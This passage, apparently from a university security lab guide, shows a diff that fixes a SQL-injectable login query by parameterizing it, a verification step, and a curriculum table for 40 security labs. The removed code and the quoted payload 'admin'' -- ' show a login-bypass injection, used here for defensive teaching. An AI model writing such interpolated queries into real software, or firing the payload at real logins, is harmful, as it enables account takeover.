Replace all string-interpolated SQL statements with parameterized queries (`%s` in `psycopg` or `?` in `sqlite3`) and enforce least-privilege PostgreSQL database roles (`NOSUPERUSER NOCREATEDB NOCREATEROLE`):

```diff
--- a/opt/portal/routes/auth.py
+++ b/opt/portal/routes/auth.py
@@ -42,8 +42,11 @@
 @app.route("/api/v1/auth/login", methods=["POST"])
 def login():
     body = request.get_json(force=True)
-    user = body.get("username", "")
+    user = str(body.get("username", ""))[:64]
     pw_hash = hash_password(body.get("password", ""))
-    query = f"SELECT id, username, role FROM users WHERE username = '{user}' AND password_hash = '{pw_hash}'"
-    cur.execute(query)
+    query = "SELECT id, username, role FROM users WHERE username = %s AND password_hash = %s"
+    cur.execute(query, (user, pw_hash))
     row = cur.fetchone()
```

---

## 6. Verification & Regression Test
After deploying the patch, re-run the `curl` proof-of-concept command and verify that the API returns `HTTP/1.1 401 Unauthorized` and that PostgreSQL query logs record the payload strictly as a bound parameter `$1 = 'admin'' -- '`.
```

---

## Section 7: University Curriculum Mapping & Lab Assessment Matrix

| Lab Range | Domain Title | Core University Competencies Tested | Recommended Grading Weight |
| :--- | :--- | :--- | :--- |
| **Labs 01–08** | Linux Systems Security, Capabilities, Systemd & Telemetry | POSIX permissions (`04000`/`02000`/`01000`), `setcap`/`getcap`, `systemd-analyze security`, `bwrap` namespaces, OpenSSH `Ed25519` & hybrid post-quantum KEX, `awk`/`jq` threat hunting, cryptographic FIM baselines | **20%** |
| **Labs 09–15** | Network Engineering, Packet Analysis, TLS & Firewalling | VLSM CIDR overlap detection, raw PCAP generation & `tshark` SYN scan filtering, DNS tunneling Shannon entropy, 2-tier X.509 SAN PKI with `openssl`, stateful `nftables` metering, ARP spoofing detection, TLS 1.3 mTLS | **20%** |
| **Labs 16–22** | Python Security Automation, C Memory Safety & Binary Analysis | `asyncio` semaphore-throttled scanning, RFC 1071 IP/TCP checksums & XMAS flag detection, GCC stack canaries (`%fs:0x28`), AddressSanitizer (`ASan`) Heap UAF detection, `-Werror=format-security`, Full RELRO/PIE/NX ELF verification, Intel `objdump` disassembly | **20%** |
| **Labs 23–32** | Web Application & API Security Engineering | Parameterized SQL queries, strict RFC 8725 JWT verification, BOLA/IDOR ownership predicates, SSRF/IMDS IP filtering, XXE entity blocking, per-request CSP nonces (`'strict-dynamic'`), OAuth 2.1 PKCE `S256`, GraphQL depth/alias limits, atomic SQLite TOCTOU mitigation, ZipSlip canonical path validation | **25%** |
| **Labs 33–40** | Container, Cloud, Detection Engineering, DFIR & Reporting | CIS Dockerfile linting, Kubernetes `PodSecurity` (`restricted`), AWS IAM `PassRole` escalation detection, Sigma rule evaluation, YARA byte/entropy scanning, Linux `/proc/self/maps` RWX memory forensics, NTFS `$MFT` `$SI` vs `$FN` timestomp proof, CVSS v4.0 finding authoring | **15%** |
